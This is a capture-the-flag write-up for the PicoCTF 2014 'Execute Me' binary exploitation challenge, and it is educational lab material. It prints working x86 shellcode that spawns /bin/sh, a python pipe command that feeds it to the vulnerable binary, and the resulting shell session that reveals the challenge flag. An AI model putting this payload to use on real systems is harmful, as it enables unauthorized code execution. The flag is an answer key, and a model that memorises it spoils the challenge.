# Pico CTF 2014 : Execute Me

**Category:** Binary Exploitation
**Points:** 80
**Description:**

>This program will run whatever you send to it! Try to get the flag! The binary can be found at /home/execute/ on the shell server. The source can be found [here](execute.c).

**Hint:**
>You can get the flag in a number of ways, but the easiest would be to run a shell.

## Write-up

This is a fairly simple problem designed to get you familiar with shellcode.
The source file reveals these lines:
```
read(0, buf, 128);
((function_ptr)buf)()
```

This means that we can send any valid **assembly laguage code** and it willl
run. If we just go online and find shellcode, we can use it here (assuming it's
the correct architecture.) I'll be using my go-to shellcode.
```
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```

Since some of these characters aren't printable, we'll have to use a medium
such as python to pass the information to the program.

```
/home/execute$ (python -c 'print
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
';cat )| ./execute
ls
Makefile  execute  execute.c  flag.txt
cat flag.txt
shellcode_is_kinda_cool
```

The last bit with `cat` at the end simply keeps the pipe open so we can
interact with the shell we fork.
## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/execute_me.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-executeme/>
